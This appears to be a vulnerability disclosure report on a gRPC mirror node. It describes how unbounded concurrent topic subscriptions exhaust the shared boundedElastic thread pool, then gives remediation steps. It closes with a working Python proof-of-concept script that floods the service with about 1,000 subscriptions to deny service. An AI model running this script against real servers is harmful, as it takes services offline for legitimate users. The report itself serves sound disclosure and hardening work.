### Title
Unbounded Concurrent gRPC Subscriptions Exhaust Shared `boundedElastic` Thread Pool in `PollingTopicListener`

### Summary
`PollingTopicListener.listen()` creates a per-subscriber polling loop that schedules blocking database queries on the JVM-global `Schedulers.boundedElastic()` thread pool. Because there is no global cap on concurrent subscriptions and `maxConcurrentCallsPerConnection` only limits calls per TCP connection (not total connections), an unprivileged attacker can open an unbounded number of connections and exhaust the shared thread pool, starving all legitimate subscribers and making the mirror node unresponsive.

### Finding Description

**Exact code path:**

`PollingTopicListener.java` line 31 instantiates the scheduler:
```java
private final Scheduler scheduler = Schedulers.boundedElastic();
```
`Schedulers.boundedElastic()` returns the JVM-global singleton `BoundedElasticScheduler`, capped at `10 × CPU_cores` threads (e.g., 80 threads on an 8-core host) with a task queue of 100,000.

`listen()` (lines 38–43) attaches this scheduler to every subscriber's polling loop:
```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)          // line 39
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .withFixedDelay(interval)
                .withScheduler(scheduler))               // line 43
```

`poll()` (lines 51–62) executes a blocking JDBC `Stream` query on whichever `boundedElastic` thread runs it:
```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

`TopicMessageServiceImpl.subscribeTopic()` (line 70) also uses the same global `boundedElastic` for the safety-check path:
```java
.subscribeOn(Schedulers.boundedElastic());
```

**Root cause:** `listen()` is stateless with respect to subscriber count. There is no counter, semaphore, or rejection gate inside `listen()` or anywhere in the call chain from `TopicMessageServiceImpl.subscribeTopic()` → `incomingMessages()` → `topicListener.listen()`. `subscriberCount` (line 48 of `TopicMessageServiceImpl`) is a metrics gauge only — it enforces nothing.

**Why the existing check fails:** `GrpcConfiguration.java` line 33 sets only:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```
`maxConcurrentCallsPerConnection` defaults to 5 (per `NettyProperties.java` line 14). This limits streams per TCP connection but imposes **no cap on the number of TCP connections**. No `maxConnectionAge`, `maxConnectionIdle`, IP-rate-limit, or authentication is configured. An attacker opens `N` connections × 5 streams = `5N` concurrent subscriptions with zero privilege.

### Impact Explanation
Each active subscription holds a `boundedElastic` thread during every 500 ms poll cycle (the default `interval`). With ~200 attacker connections (1,000 subscriptions) on an 8-core host, the 80-thread pool is saturated. Legitimate subscribers' poll tasks queue behind attacker tasks; when the 100,000-task queue fills, `RejectedExecutionException` is thrown, terminating legitimate subscriptions. Because `boundedElastic()` is a JVM-global singleton, exhaustion also breaks the safety-check path in `TopicMessageServiceImpl` and `SharedPollingTopicListener`, making the entire gRPC service unresponsive. This is a non-network-based DoS requiring no authentication.

### Likelihood Explanation
The attack requires only a gRPC client library and the ability to open TCP connections to port 5600. No credentials, tokens, or special knowledge are needed. The attack is trivially scriptable, repeatable, and can be sustained indefinitely. A single attacker machine with a modest number of connections (well within OS limits) is sufficient to exhaust the thread pool on a typical deployment.

### Recommendation
1. **Add a global subscriber cap** in `ListenerProperties` (e.g., `maxSubscribers`) and enforce it in `TopicMessageServiceImpl.subscribeTopic()` using an `AtomicInteger` semaphore that rejects new subscriptions with `RESOURCE_EXHAUSTED` when the cap is reached.
2. **Limit total connections** in `GrpcConfiguration` via `serverBuilder.maxConnectionAge(...)` and `serverBuilder.maxConnectionIdle(...)`, and consider adding a global `maxConnections` limit.
3. **Use a dedicated, bounded scheduler** for `PollingTopicListener` instead of the JVM-global `Schedulers.boundedElastic()`, so attacker-induced exhaustion cannot affect other reactive pipelines.
4. **Add IP-based rate limiting** at the ingress/load-balancer layer (the Helm chart's `maxRatePerEndpoint: 250` applies only to GCP backend policy and does not protect the raw gRPC port).

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# proto-generated stub for ConsensusService/subscribeTopic
TARGET = "mirror-node-host:5600"
NUM_CONNECTIONS = 200
STREAMS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection default

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = ConsensusServiceStub(channel)
    streams = []
    for _ in range(STREAMS_PER_CONN):
        req = ConsensusTopicQuery(topicID=ConsensusTopicID(topicNum=1),
                                  consensusStartTime=Timestamp(seconds=0))
        # Each call invokes PollingTopicListener.listen() server-side
        streams.append(stub.subscribeTopic(req))
    # Keep streams open indefinitely
    for s in streams:
        try:
            for _ in s:
                pass
        except Exception:
            pass

with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as pool:
    list(pool.map(flood_connection, range(NUM_CONNECTIONS)))
# Result: ~1000 concurrent subscriptions saturate boundedElastic (80 threads on 8-core host),
# all legitimate subscriber poll tasks queue/starve, mirror node becomes unresponsive.
```
